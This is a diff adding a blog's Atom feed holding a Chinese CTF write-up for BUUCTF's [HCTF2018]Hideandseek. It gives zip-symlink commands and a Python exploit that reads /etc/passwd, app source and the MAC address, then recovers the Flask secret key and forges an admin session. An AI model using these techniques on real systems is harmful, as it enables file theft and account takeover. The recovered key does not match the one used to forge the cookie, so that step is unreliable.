@@ -1,0 +1,232 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>http://odiws.github.io</id>
+    <title>Hexo • Posts by &#34;python_seed函数&#34; tag</title>
+    <link href="http://odiws.github.io" />
+    <updated>2024-11-17T12:20:27.000Z</updated>
+    <category term="buuctf" />
+    <category term="system_file" />
+    <category term="sql文件读取" />
+    <category term="文件内无字符rce" />
+    <category term="文件上传" />
+    <category term="php绕过open_basedir设置" />
+    <category term="无字母rce" />
+    <category term="ctf" />
+    <category term="php原生类利用" />
+    <category term="php反序列化" />
+    <category term="md5()和sha1()对类进行hash 触发__toString方法" />
+    <category term="http" />
+    <category term="cms框架" />
+    <category term="python" />
+    <category term="mongodb注入" />
+    <category term="条件竞争：利用session.upload_progress" />
+    <category term="preg_match绕过" />
+    <category term="$_server query_string 绕过" />
+    <category term="$_request绕过" />
+    <category term="file_get_cotents绕过" />
+    <category term="sha1函数比较数组绕过" />
+    <category term="create_function运用" />
+    <category term="buuctf， 反序列化" />
+    <category term="regexp注入" />
+    <category term="ECB加密" />
+    <category term="php7 segment fault特性" />
+    <category term="json数据爬虫" />
+    <category term="phar反序列化" />
+    <category term="js" />
+    <category term="CRLF Injection" />
+    <category term="soap" />
+    <category term="pickle反序列化" />
+    <category term="thinkphpV6.0.0" />
+    <category term="buuctf， 伪随机数" />
+    <category term="zip加密" />
+    <category term="xxe" />
+    <category term="xml_upload" />
+    <category term="flask的session伪造" />
+    <category term="二次渲染" />
+    <category term="buuctf，Perl后端文件上传" />
+    <category term="buuctf，xxe漏洞" />
+    <category term="java" />
+    <category term="flask" />
+    <category term="ctf工具安装教程" />
+    <category term="sql注入" />
+    <category term="php绕过open_opedir设置" />
+    <category term="TOTP" />
+    <category term="rce" />
+    <category term="ssti" />
+    <category term="insert截断" />
+    <category term="xss攻击" />
+    <category term="c的预处理" />
+    <category term="图片类" />
+    <category term="爬虫" />
+    <category term="js原型链污染" />
+    <category term="反序列化字符串逃逸" />
+    <category term="sql injection" />
+    <category term="文件上传(头像上传)" />
+    <category term="session反序列化" />
+    <category term="ssrf" />
+    <category term="HTTP走私攻击" />
+    <category term="json数据unicode转码绕过" />
+    <category term="对sqlite的sql注入" />
+    <category term="未理解" />
+    <category term="命令执行" />
+    <category term="zip软链接" />
+    <category term="python_seed函数" />
+    <category term="session伪造" />
+    <category term="js-vm沙箱逃逸" />
+    <entry>
+        <id>http://odiws.github.io/2024/11/17/HCTF2018-Hideandseek/</id>
+        <title>[HCTF2018]Hideandseek</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/11/17/HCTF2018-Hideandseek/"/>
+        <content type="html">&lt;h2 id=&#34;hctf2018hideandseek&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hctf2018hideandseek&#34;&gt;#&lt;/a&gt; [HCTF2018]Hideandseek&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202411172023078.png&#34; alt=&#34;image-20241117202323906&#34;&gt;&lt;/p&gt;
+&lt;p&gt;登陆进去是一个文件上传的页面，但是是上传 zip 文件，上传文件之后好像会解析内容，进行文件读取，可以想一下 zip 软链接，用 /etc/passwd 试一下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ln -s /etc/passwd 321
+zip -y 111.zip 321
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;上传生成的 zip 文件得到回显&lt;/p&gt;
+&lt;p&gt;进行部分修改后：&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; os&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; sys&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;make_zip&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;system&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;ln -s &#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;argv&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39; test_exp&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;system&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;zip -y test_exp.zip test_exp&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;run&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    make_zip&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    res &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;argv&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; files&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;the_file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;./test_exp.zip&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;rb&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;system&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;rm -rf test_exp&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;system&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;rm -rf test_exp.zip&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; __name__ &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    run&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;运行命令：&lt;/p&gt;
+&lt;p&gt;运行命令：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python3 ln_exp.py http://dda6fb28-b2f4-4cbb-8a41-14dcfac2d826.node3.buuoj.cn/upload /app/uwsgi.ini
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;得到内容：&lt;/p&gt;
+&lt;p&gt;可以看到其源码应是 /app/main.py，使用 EXP 尝试读取源码：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python3 ln_exp.py http://dda6fb28-b2f4-4cbb-8a41-14dcfac2d826.node3.buuoj.cn/upload /app/main.py
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;得到其源码：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from flask import Flask
+app = Flask(__name__)
+
+
+@app.route(&amp;quot;/&amp;quot;)
+def hello():
+    return &amp;quot;Hello World from Flask in a uWSGI Nginx Docker container with \
+     Python 3.6 (default)&amp;quot;
+
+if __name__ == &amp;quot;__main__&amp;quot;:
+    app.run(host=&#39;0.0.0.0&#39;, debug=True, port=80)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;开始有些疑惑，但在查阅了大佬 wp 后，发现应该是这道题小 bug，原题中的 main.py 文件应在 /app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py 路径下，而本题也是，使用写好的 EXP 读取：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python3 ln_exp.py http://dda6fb28-b2f4-4cbb-8a41-14dcfac2d826.node3.buuoj.cn/upload /app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;得到回显：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from flask import Flask,session,render_template,redirect, url_for, escape, request,Response
+import uuid
+import base64
+import random
+import flag
+from werkzeug.utils import secure_filename
+import os
+random.seed(uuid.getnode())
+app = Flask(__name__)
+app.config[&#39;SECRET_KEY&#39;] = str(random.random()*100)
+app.config[&#39;UPLOAD_FOLDER&#39;] = &#39;./uploads&#39;
+app.config[&#39;MAX_CONTENT_LENGTH&#39;] = 100 * 1024
+ALLOWED_EXTENSIONS = set([&#39;zip&#39;])
+
+def allowed_file(filename):
+    return &#39;.&#39; in filename and \
+           filename.rsplit(&#39;.&#39;, 1)[1].lower() in ALLOWED_EXTENSIONS
+
+
+@app.route(&#39;/&#39;, methods=[&#39;GET&#39;])
+def index():
+    error = request.args.get(&#39;error&#39;, &#39;&#39;)
+    if(error == &#39;1&#39;):
+        session.pop(&#39;username&#39;, None)
+        return render_template(&#39;index.html&#39;, forbidden=1)
+
+    if &#39;username&#39; in session:
+        return render_template(&#39;index.html&#39;, user=session[&#39;username&#39;], flag=flag.flag)
+    else:
+        return render_template(&#39;index.html&#39;)
+
+
+@app.route(&#39;/login&#39;, methods=[&#39;POST&#39;])
+def login():
+    username=request.form[&#39;username&#39;]
+    password=request.form[&#39;password&#39;]
+    if request.method == &#39;POST&#39; and username != &#39;&#39; and password != &#39;&#39;:
+        if(username == &#39;admin&#39;):
+            return redirect(url_for(&#39;index&#39;,error=1))
+        session[&#39;username&#39;] = username
+    return redirect(url_for(&#39;index&#39;))
+
+
+@app.route(&#39;/logout&#39;, methods=[&#39;GET&#39;])
+def logout():
+    session.pop(&#39;username&#39;, None)
+    return redirect(url_for(&#39;index&#39;))
+
+@app.route(&#39;/upload&#39;, methods=[&#39;POST&#39;])
+def upload_file():
+    if &#39;the_file&#39; not in request.files:
+        return redirect(url_for(&#39;index&#39;))
+    file = request.files[&#39;the_file&#39;]
+    if file.filename == &#39;&#39;:
+        return redirect(url_for(&#39;index&#39;))
+    if file and allowed_file(file.filename):
+        filename = secure_filename(file.filename)
+        file_save_path = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], filename)
+        if(os.path.exists(file_save_path)):
+            return &#39;This file already exists&#39;
+        file.save(file_save_path)
+    else:
+        return &#39;This file is not a zipfile&#39;
+
+
+    try:
+        extract_path = file_save_path + &#39;_&#39;
+        os.system(&#39;unzip -n &#39; + file_save_path + &#39; -d &#39;+ extract_path)
+        read_obj = os.popen(&#39;cat &#39; + extract_path + &#39;/*&#39;)
+        file = read_obj.read()
+        read_obj.close()
+        os.system(&#39;rm -rf &#39; + extract_path)
+    except Exception as e:
+        file = None
+    
+    os.remove(file_save_path)
+    if(file != None):
+        if(file.find(base64.b64decode(&#39;aGN0Zg==&#39;).decode(&#39;utf-8&#39;)) != -1):
+            return redirect(url_for(&#39;index&#39;, error=1))
+    return Response(file)
+
+if __name__ == &#39;__main__&#39;:
+    #app.run(debug=True)
+    app.run(host=&#39;0.0.0.0&#39;, debug=True, port=10008)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这次读取的才是真正的 main.py 源码&lt;br&gt;
+不对全部的源码进行分析了，直接查找所需的 SECRET_KEY 的值发现：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;app.config[&#39;SECRET_KEY&#39;] = str(random.random()*100)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;其对 SECRET_KEY 做了 random 随机处理，但 random 生成的随机数都是伪随机数，有一定的规律。&lt;br&gt;
+发现了其中：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;random.seed(uuid.getnode())
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;random.seed () 方法改变随机数生成器的种子，Python 之 random.seed () 用法&lt;br&gt;
+ uuid.getnode () 方法以 48 位正整数形式获取硬件地址，也就是服务器的 MAC 地址&lt;/p&gt;
+&lt;p&gt;若获取了服务器的 MAC 地址值，那么就可以构造出为伪随机的种子值，想到 Linux 中一切皆文件，查找到 MAC 地址存放在 /sys/class/net/eth0/address 文件中，读取该文件：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python3 ln_exp.py http://dda6fb28-b2f4-4cbb-8a41-14dcfac2d826.node3.buuoj.cn/upload /sys/class/net/eth0/address
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;得到其十六进制所表示的 MAC 地址：&lt;/p&gt;
+&lt;p&gt;通过 Python3 将其转换为十进制：&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;mac &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;02:42:ac:10:8e:10&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;split&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#转成十进制&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;mac_int &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; mac&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#转成二进制&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;mac_bin &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bin&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;replace&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;0b&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;zfill&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; mac_int&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#转成整数&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;mac_dec &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;join&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mac_bin&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mac_dec&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;运行运行&lt;br&gt;
+种子值得到 2485377863184，编写 Python 构造 SECRET_KEY 的值：&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; random&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;random&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;seed&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2485377863184&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;SECRET_KEY &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;random&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;random&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;SECRET_KEY&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;运行&lt;br&gt;
+运行后，得到 SECRET_KEY 的值为：74.28774432740572，使用 flask-session-cookie-manager 构造 Session：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python3 flask_session_cookie_manager3.py encode -s &amp;quot;50.98160837138328&amp;quot; -t &amp;quot;&amp;#123;&#39;username&#39;: &#39;admin&#39;&amp;#125;&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;运行后，得到加密的 Session：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;eyJ1c2VybmFtZSI6ImFkbWluIn0.ZzndHQ.kI_BgtAh87MUz4vU4W8o7oyoVu8
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;在 F12 中的 Application 中替换：&lt;/p&gt;
+&lt;p&gt;刷新后，成功以 admin 身份登陆，得到 flag：&lt;br&gt;
+&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202411172037747.png&#34; alt=&#34;image-20241117203753620&#34;&gt;&lt;/p&gt;
+&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNzI5Ni9hcnRpY2xlL2RldGFpbHMvMTEyNDc1MDUx&#34;&gt;https://blog.csdn.net/weixin_44037296/article/details/112475051&lt;/span&gt;&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <category term="zip软链接" />
+        <category term="python_seed函数" />
+        <updated>2024-11-17T12:20:27.000Z</updated>
+    </entry>
+</feed>
